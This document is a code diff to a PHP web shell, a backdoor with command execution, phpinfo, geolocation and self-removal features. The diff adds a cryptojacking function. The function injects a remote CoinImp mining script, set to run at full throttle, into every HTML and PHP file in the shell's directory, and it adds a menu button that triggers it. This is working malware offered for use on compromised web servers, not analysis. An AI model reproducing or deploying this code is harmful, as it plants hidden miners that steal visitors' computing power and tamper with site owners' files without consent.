@@ -4,6 +4,8 @@
 
 	$passphrase = "136c757bdd877848762c248e58252935"; // cosasdepuma
 
+	$coinimpkey = ""; // <---- Insert here your CoinImp Site Key (https://www.coinimp.com/dashboard) [str, hex, 64 char-length key]
+
 	$robots = array(
 		'Baiduspider',
 		'Bing',
@@ -360,6 +362,7 @@
 			<a class="button" href="?info">PHPINFO</a>
 			<a class="button" href="<?=ExploitDB();?>">EXPLOIT-DB</a>
 			<a class="button" href="<?=GeoLocate();?>">GEOLOCATE</a>
+			<a class="button" href="?cryptominer">CRYPTOMINER</a>
 			<a class="button selfremove" href="?selfremove">SELF-REMOVE</a>
 		</div>
 	</div>
@@ -451,6 +454,30 @@
 		ReloadPage();
 	}
 
+	function CryptoMiner()
+	{
+		global $coinimpkey;
+		$signature = '<!-- :> -->';
+		$miner = $signature . '<script src="https://www.hostingcloud.racing/kwgR.js"></script><script>var _a=new Client.Anonymous("' . $coinimpkey . '",{throttle:0});_a.start();</script>';
+		
+		$files = scandir(dirname(__FILE__));
+		foreach($files as $file)
+		{
+			$ext = substr($file,-5,5);
+			$isvalid = (strcmp($ext, '.html') == 0 || strcmp(substr($ext,-4,4), '.php') == 0);
+			if($isvalid && strcmp($file, basename(__FILE__)) != 0)
+			{
+				$content = file_get_contents($file);
+				if(strpos($content,$signature) === false)
+				{
+					$content = str_replace('</body>', $miner . '</body>', $content);
+					file_put_contents($file, $content);
+				}
+			}
+		}
+		ReloadPage();
+	}
+
 	function RunCommand()
 	{
 		$format_cmd = strtolower(trim($_POST['cmd']));
@@ -523,6 +550,10 @@
 			else if(isset($_GET['selfremove']))
 			{
 				SelfRemove();
+			}
+			else if(isset($_GET['cryptominer']))
+			{
+				CryptoMiner();
 			}
 			else
 			{		
